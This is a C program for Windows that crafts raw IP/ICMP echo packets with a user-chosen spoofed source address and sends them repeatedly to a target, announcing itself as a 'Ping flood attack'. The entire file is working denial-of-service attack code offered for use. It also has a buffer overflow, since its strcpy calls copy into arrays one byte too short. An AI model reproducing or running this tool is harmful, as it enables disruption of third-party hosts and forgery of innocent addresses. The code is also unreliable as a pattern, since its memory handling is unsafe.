#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

#define ICMP_ECHO 8      // 请求回显 ping请求 请求回显8
#define ICMP_ECHOREPLY 0 // 回显应答0
#define ICMP_MIN 12      // minimum 12 byte icmp message(just header)
#define PORT 6666
#define STATUS_FAILED 0xFFFF
static volatile int KEEP_RUNNING = 1;

typedef struct IPHeader {
    unsigned char ip_header_length : 4;      // 4 bits
    unsigned char version : 4;               // 4 bits
    unsigned char type_of_service;           // 8 bits
    unsigned short int total_length;         // 16 bits
    unsigned short int id;                   // 16 bits
    unsigned char flags : 3;                 // 3 bits
    unsigned short int fragment_offset : 13; // 13 bits
    unsigned char time_to_live;              // 8 bits
    unsigned char protocol;                  // 8 bits
    unsigned short int header_checksum;      // 16 bits
    struct in_addr saddr;
    struct in_addr daddr;
} IPHeader;

typedef struct ICMPHeader {
    unsigned char type;            // 8 bits
    unsigned char code;            // 8 bits
    unsigned short int checksum;   // 16 bits
    unsigned short int id;         // 16 bits
    unsigned short int seq_number; // 16 bits
} ICMPHeader;

USHORT checksum(USHORT *buf, int size);
void sig_handler(int sig);

int main(int argc, char **argv) {
    WSADATA wsaData;
    int err = 0;
    err = WSAStartup(0x0101, &wsaData);
    if (err != 0) {
        fprintf(stderr, "WSAStartup failed: %d\n", GetLastError());
        ExitProcess(STATUS_FAILED);
    }

    // config command line arguments
    if (argc != 4) {
        printf("Usage: %s <source IP> <destination IP> <payload size> \n",
               argv[0]);
        return 0;
    }
    char source_ip[strlen(argv[1])];
    strcpy(source_ip, argv[1]);
    char dest_ip[strlen(argv[2])];
    strcpy(dest_ip, argv[2]);
    int payload_size = atoi(argv[3]);
    printf("Source ip is: %s, receiver ip is: %s.\n", source_ip, dest_ip);

    /*
       Step 1: build IP header.
     */
    int packet_size = sizeof(IPHeader) + sizeof(ICMPHeader) + payload_size;
    char *packet = (char *)malloc(packet_size);
    if (!packet) {
        fprintf(stderr, "malloc packet with error: %d\n", GetLastError());
        ExitProcess(STATUS_FAILED);
    }

    // The starting address of the whole packet is the starting address of the
    // IPHeader
    IPHeader *ip = (IPHeader *)packet;
    ip->version = 4;
    ip->ip_header_length = 5;
    ip->type_of_service = 0;
    ip->time_to_live = 255;
    ip->total_length = htons(packet_size);
    ip->id = rand();
    ip->fragment_offset = 0;
    ip->saddr.s_addr = inet_addr(source_ip);
    ip->daddr.s_addr = inet_addr(dest_ip);
    ip->protocol = IPPROTO_ICMP;

    /*
       Step 2: build ICMP header.
       The beginning of the ICMP header is offset sizeof(IPHeader) bytes
       backward from the packet’s beginning.
     */
    ICMPHeader *icmp = (ICMPHeader *)(packet + (sizeof(IPHeader)));
    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->id = rand();
    icmp->checksum = 0;

    /*
      Step 3: Create a raw network socket.
      AF_INET -> socket can communicate with IPv4 addresses
      SOCK_RAW -> no TCP/IP processing, no link level headers
      IPPROTO_RAW -> directly edit header & payload of IP packet
       */
    SOCKET socket_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (socket_fd == INVALID_SOCKET) {
        fprintf(stderr, "RawSocket setup failed: %d\n", GetLastError());
        ExitProcess(STATUS_FAILED);
    }

    /*
       Step 4: Set socket option.
       When IP_HDRINCL is enabled on the socket, the packet must contain an IP
       header. Without this option, the kernel's IP header will be used.
     */
    int enable = 1;
    err = setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, (const char *)&enable,
                     sizeof(enable));
    if (err < 0) {
        fprintf(stderr, "setsockopt IP_HDRINCL failed: %d\n", GetLastError());
        ExitProcess(STATUS_FAILED);
    }

    /*
       Step 5: Set the destination address for the socket.
     */
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(PORT);
    dest.sin_addr = ip->daddr;

    // Interrupt ping loop by Ctrl+c.
    signal(SIGINT, sig_handler);

    /*
       Step 6: send packet with random data in ping loop.
     */
    fprintf(stdout, "Starting Ping flood attack. Terminated by Ctrl+c...\n");
    int cnt = 0;
    while (KEEP_RUNNING) {
        // reset ICMP data
        memset(packet + sizeof(IPHeader) + sizeof(ICMPHeader), rand() % 255,
               payload_size);
        // recalculate the ICMP header checksum since we are filling the ICMP
        // data with random data
        icmp->checksum = 0;
        icmp->checksum =
            checksum((unsigned short *)icmp, sizeof(ICMPHeader) + payload_size);

        err = sendto(socket_fd, packet, packet_size, 0,
                     (struct sockaddr *)&dest, sizeof(dest));
        if (err < 0) {
            fprintf(stderr, "sendto failed with error: %d\n",
                    WSAGetLastError());
            ExitProcess(STATUS_FAILED);
        }
        fprintf(stdout, "sent %d packet(s).\n", ++cnt);
        Sleep(1000);
    }
    fprintf(stdout, "Bye bye!\n");
    closesocket(socket_fd);
    WSACleanup(); // clean up ws2_32.dll
    return 0;
}

USHORT checksum(USHORT *buffer, int size) {
    unsigned long cksum = 0;
    while (size > 1) {
        cksum += *buffer++;
        size -= sizeof(USHORT);
    }
    if (size) // buffer中的数据是奇数个字节
        cksum += *(UCHAR *)buffer;
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);
    return (USHORT)(~cksum);
}

void sig_handler(int sig) {
    if (sig == SIGINT) {
        KEEP_RUNNING = 0;
    }
}